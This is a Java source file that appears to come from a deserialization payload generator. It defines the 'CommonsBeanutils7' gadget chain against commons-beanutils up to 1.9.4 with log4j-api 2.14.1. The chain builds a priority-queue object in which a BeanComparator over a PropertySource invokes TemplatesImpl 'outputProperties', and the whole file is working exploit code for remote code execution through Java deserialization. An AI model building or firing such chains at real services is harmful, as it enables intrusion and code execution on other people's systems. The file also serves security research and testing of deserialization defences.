package com.ppp.chain.commonsbeanutils;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import org.apache.logging.log4j.util.PropertySource;

import java.util.Comparator;

/**
 * @author Whoopsunix
 * <p>
 * CommonsBeanutilsPropertySource
 */
@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "org.apache.logging.log4j:log4j-api:2.14.1"})
@Authors({Authors.SummerSec})
@Sink({Sink.TemplatesImpl})
public class CommonsBeanutils7 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils7.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject, sinksHelper.getCbVersion());

        return kickOffObject;
    }

    public Object getChain(Object templates, CBVersionEnum version) throws Exception {
        PropertySource propertySource = new PropertySource() {
            @Override
            public int getPriority() {
                return 0;
            }
        };
        Comparator comparator = BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.PropertySource, version);
        return BeanComparatorBuilder.queueGadgetMaker(comparator, templates, propertySource, "outputProperties");
    }
}
